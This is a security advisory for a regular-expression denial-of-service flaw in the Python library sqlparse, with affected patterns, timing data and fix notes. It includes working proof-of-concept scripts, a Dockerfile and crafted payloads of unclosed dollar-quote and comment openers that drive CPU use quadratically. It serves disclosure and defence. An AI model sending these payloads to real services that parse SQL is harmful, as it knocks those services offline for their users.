# sqlparse: Inefficient Regex Handling of Dollar-Quoted SQL Literals Leads to ReDoS (Denial of Service)

- GHSA: GHSA-prg7-hcfm-mfcr
- CVE: CVE-2026-59893
- Published: 2026-08-17T17:49:55Z
- GHSA severity: high
- CVSS v3.1: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (7.5)
- CWE: CWE-1333
- Packages: pip:sqlparse
- Source: https://github.com/advisories/GHSA-prg7-hcfm-mfcr

---

### Summary

sqlparse contains a Regular Expression Denial of Service (ReDoS) vulnerability in its dollar-quoted SQL literal lexer. The regex pattern at `sqlparse/keywords.py:33` uses a backreference (`\1`) to match closing dollar-quote delimiters, causing O(n²) CPU complexity when processing inputs containing many unique, unmatched dollar-quote opening sequences. An attacker who can supply arbitrary SQL text to any application using sqlparse can trigger sustained CPU exhaustion, resulting in a denial of service. No authentication or special privileges are required.

**Scope note:** the same regex shape — a lazy dot-all quantifier terminated by a delimiter, applied at every input position by the lexer loop — is also present in the two multiline-comment patterns. Those are covered by this advisory and by the same fix; see "Additional affected pattern: multiline comments" below.

### Details

The vulnerable regex is defined in `sqlparse/keywords.py` as part of `SQL_REGEX`:

```python
# sqlparse/keywords.py:33
(r'((?<![\w\"\$])\$(?:[_A-ZÀ-Ü]\w*)?\$)[\s\S]*?\1', tokens.Literal),
```

This pattern first captures a dollar-quote delimiter (e.g., `$tag$`) into group 1, then attempts to match any characters (`[\s\S]*?`) up to the same delimiter again via backreference `\1`. When no matching closing delimiter exists, the regex engine exhausts the remaining input before concluding there is no match. For a sequence of N unique unmatched openers, each opener triggers a full scan of the remaining string, yielding O(N²) total regex work.

The lexer applies this regex at every character position (`sqlparse/lexer.py:136-138`):

```python
# sqlparse/lexer.py:136-138
for pos, char in iterable:
    for rexmatch, action in self._SQL_REGEX:
        m = rexmatch(text, pos)
```

The data flow from public API to the vulnerable sink is:

1. `sqlparse/__init__.py:20` — `parse(sql)` accepts caller-controlled SQL.
2. `sqlparse/__init__.py:29` — delegates to `parsestream(sql, encoding)`.
3. `sqlparse/__init__.py:43` — `FilterStack.run(stream, encoding)` is invoked.
4. `sqlparse/engine/filter_stack.py:31` — `lexer.tokenize(sql, encoding)` is called with no length limit or timeout.
5. `sqlparse/lexer.py:137` — every regex in `_SQL_REGEX` is tried at the current position.
6. `sqlparse/keywords.py:33` — the backreference regex performs repeated delimiter searches.

The `MAX_GROUPING_TOKENS = 10000` limit in `sqlparse/engine/grouping.py:20` fires only after lexing completes and does not bound regex CPU time. There is no input length check, delimiter count check, or regex timeout before the sink.

Empirically measured scaling confirms super-linear complexity:

| Input (N unique openers) | Bytes  | Elapsed  |
|--------------------------|--------|----------|
| 250                      | 1,889  | 0.066 s  |
| 500                      | 3,889  | 0.144 s  |
| 1,000                    | 7,889  | 0.397 s  |
| 2,000                    | 16,889 | 1.314 s  |

The timing ratio from n=1000 to n=2000 is **3.31×** (input doubled → time tripled), confirming O(n²) growth.

### PoC

**Prerequisites:** Python 3.x with sqlparse installed (tested against version `0.5.6.dev0`, commit `c923da9`).

**Using Docker (isolated reproduction):**

```bash
# Build from the repository root (parent of vuln-001/)
docker build -t sqlparse-vuln001 -f vuln-001/Dockerfile .

# Run with no network access
docker run --rm --network=none sqlparse-vuln001
```

**Direct Python reproduction:**

```python
import time
import sqlparse
from sqlparse.exceptions import SQLParseError

def make_payload(n: int) -> str:
    # N unique unmatched dollar-quote openers — none have a matching closing delimiter
    return " ".join(f"$a{i}$x" for i in range(n))

for n in [250, 500, 1000, 2000]:
    payload = make_payload(n)
    t0 = time.perf_counter()
    try:
        sqlparse.parse(payload)
        status = "ok"
    except SQLParseError as e:
        status = f"SQLParseError: {e}"
    elapsed = time.perf_counter() - t0
    print(f"n={n:>5}  bytes={len(payload):>7}  elapsed={elapsed:.3f}s  status={status}")
```

**Expected output (super-linear scaling confirms ReDoS):**

```
n=  250  bytes=   1889  elapsed=0.066s  status=ok
n=  500  bytes=   3889  elapsed=0.144s  status=ok
n= 1000  bytes=   7889  elapsed=0.397s  status=ok
n= 2000  bytes=  16889  elapsed=1.314s  status=ok

Key ratio (n=1000 -> n=2000): 3.31x
[PASS] Super-linear (O(n^2)) scaling CONFIRMED.
```

**Attack input structure:**

```
$a0$x $a1$x $a2$x ... $a{N-1}$x
```

Each token `$ai$x` resembles a PostgreSQL-style dollar-quote opening tag. Because every tag is unique and no closing tag is present, the regex engine must scan to the end of the string for each opener before backtracking.

**Remediation (proposed patch):**

Replace the backreference regex with a deterministic two-pass approach: first locate all delimiter positions with `re.finditer`, then resolve open/close pairs in O(n) time, eliminating catastrophic backtracking entirely. See `report_excerpt.md` for the full diff.

### Additional affected pattern: multiline comments

Reported independently as GHSA-3crh-2448-7855 (by @7thParkk) and merged into this advisory: it is the same defect class in the same lexer loop, and it is addressed by the same fix.

Two further entries in `SQL_REGEX` use the same lazy dot-all shape, terminated by a literal delimiter instead of a backreference:

```python
# sqlparse/keywords.py:20
(r'/\*\+[\s\S]*?\*/', tokens.Comment.Multiline.Hint),
# sqlparse/keywords.py:23
(r'/\*[\s\S]*?\*/',    tokens.Comment.Multiline),
```

A backreference is not required to trigger the quadratic behaviour. The cost comes from the lexer retrying every pattern at every input position (`sqlparse/lexer.py:136-138`): an unterminated `/*` scans to the end of the input and fails, so N unclosed openers cost O(N²).

**PoC**

```python
import time, sqlparse

for n in (2000, 4000, 8000, 16000):
    payload = "/*x " * n
    t0 = time.perf_counter()
    sqlparse.parse(payload)
    print(f"n={n:6d}  bytes={len(payload):7d}  elapsed={time.perf_counter()-t0:.3f}s")
```

Lexing-only timings on `0.5.6.dev0` (commit `f80af6a`), isolating the regex work from grouping:

| openers | bytes | lexing |
|---------|-------|--------|
| 2,000   | 8 KB  | 0.057 s |
| 4,000   | 16 KB | 0.196 s |
| 8,000   | 32 KB | 0.729 s |
| 16,000  | 64 KB | 2.717 s |

Roughly 3.7x per doubling of the input, i.e. quadratic.

**Note for reproduction:** `"/*" * n` on its own is *linear* and does not reproduce the issue — in `/*/*/*...` the openers form overlapping `*/` pairs, so the pattern matches immediately. The opener must be padded (e.g. `"/*x "`) so that it never closes. A reproduction that only tries the unpadded form will wrongly conclude the issue is not present.

### Impact

This is a **Regular Expression Denial of Service (ReDoS)** vulnerability. Any application or service that passes user-controlled SQL text to `sqlparse.parse()`, `sqlparse.format()`, or `sqlparse.split()` is affected. No authentication, special configuration, or elevated privileges are required — a single crafted HTTP request (or any other input channel carrying SQL text) is sufficient.

Under sustained attack, one or more CPU cores can be kept at 100% utilization, degrading or completely blocking service for all other users. Because the grouping-stage token limit fires only after the regex work is done, it provides no protection against this attack.

Affected use cases include: web applications that accept and display or format SQL; database administration tools; ORM query inspectors; SQL linters and formatters exposed as APIs.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
FROM python:3.11-slim

# Install build dependencies
RUN apt-get update && apt-get install -y --no-install-recommends \
    build-essential \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Copy the sqlparse repository source code
COPY repo/ /app/repo/

# Install sqlparse from local source in editable mode
RUN pip install --no-cache-dir -e /app/repo/

# Copy the PoC script (build context is the parent of vuln-001/)
COPY vuln-001/poc.py /app/poc.py

# Default: run the PoC
CMD ["python3", "/app/poc.py"]
```

#### `poc.py`

```python
"""
PoC: ReDoS in sqlparse dollar-quoted literal regex (VULN-001)

Affected code: sqlparse/keywords.py:33
    (r'((?<![\\w\\"\\$])\\$(?:[_A-ZÀ-Ü]\\w*)?\\$)[\\s\\S]*?\\1', tokens.Literal)

The backreference \\1 forces the regex engine to scan the entire remaining input
for each unmatched unique dollar-quote delimiter, yielding O(n^2) CPU complexity.

Attack input: a sequence of N unique, never-closed dollar-quote openers
    $a0$x $a1$x $a2$x ... $a{N-1}$x

Each opener $ai$ is unique, so the regex engine must exhaust the remaining
string before concluding no match exists.  With N openers this creates
O(N^2) regex work.

Expected observation: elapsed time grows quadratically (roughly 4x per 2x N).
PASS criterion: timing ratio between n=2000 and n=1000 >= 3.0 (clear super-linear).
"""

import sys
import time

try:
    import sqlparse
    from sqlparse.exceptions import SQLParseError
except ImportError as exc:
    print(f"[ERROR] Cannot import sqlparse: {exc}", file=sys.stderr)
    sys.exit(2)

print("=" * 60)
print("VULN-001 ReDoS PoC: sqlparse dollar-quoted literal regex")
print("=" * 60)
print(f"sqlparse version: {sqlparse.__version__}")
print()


def make_payload(n: int) -> str:
    """Generate N unique unmatched dollar-quote openers.

    Each token '$ai$x' looks like an opening dollar-quote delimiter
    but never has a closing delimiter, so the regex engine must scan
    the entire remaining string before giving up on each one.
    """
    return " ".join(f"$a{i}$x" for i in range(n))


results = []

sample_sizes = [250, 500, 1000, 2000]

for n in sample_sizes:
    payload = make_payload(n)
    byte_len = len(payload.encode())
    t_start = time.perf_counter()
    try:
        sqlparse.parse(payload)
        status = "ok"
    except SQLParseError as exc:
        status = f"SQLParseError({exc})"
    except Exception as exc:
        status = f"Exception({type(exc).__name__}: {exc})"
    elapsed = time.perf_counter() - t_start

    results.append((n, byte_len, elapsed, status))
    print(f"n={n:>5}  bytes={byte_len:>7}  elapsed={elapsed:>8.3f}s  status={status}")

print()

# Compute scaling ratios between consecutive sample sizes
print("Scaling analysis (O(n^2) expected -> ratio >= ~4x per 2x input):")
for i in range(1, len(results)):
    n_prev, _, t_prev, _ = results[i - 1]
    n_curr, _, t_curr, _ = results[i]
    if t_prev > 0:
        ratio = t_curr / t_prev
        n_ratio = n_curr / n_prev
        print(f"  n={n_prev} -> n={n_curr} (input x{n_ratio:.1f}): time ratio = {ratio:.2f}x")

print()

# PASS/FAIL verdict based on timing ratio between largest two points
_, _, t_1000, _ = results[2]  # n=1000
_, _, t_2000, _ = results[3]  # n=2000

PASS_THRESHOLD = 3.0

if t_1000 > 0:
    ratio_1000_2000 = t_2000 / t_1000
else:
    ratio_1000_2000 = 0.0

print(f"Key ratio (n=1000 -> n=2000): {ratio_1000_2000:.2f}x")

if ratio_1000_2000 >= PASS_THRESHOLD:
    print()
    print("[PASS] Super-linear (O(n^2)) scaling CONFIRMED.")
    print(f"       Time ratio {ratio_1000_2000:.2f}x >= threshold {PASS_THRESHOLD}x.")
    print("       ReDoS vulnerability in sqlparse dollar-quote regex is REPRODUCED.")
    sys.exit(0)
else:
    print()
    print("[FAIL] Super-linear scaling NOT confirmed within this run.")
    print(f"       Time ratio {ratio_1000_2000:.2f}x < threshold {PASS_THRESHOLD}x.")
    print("       The host may be too fast or JIT effects obscured the result.")
    print("       Try larger sample sizes or re-run on a slower host.")
    sys.exit(1)
```
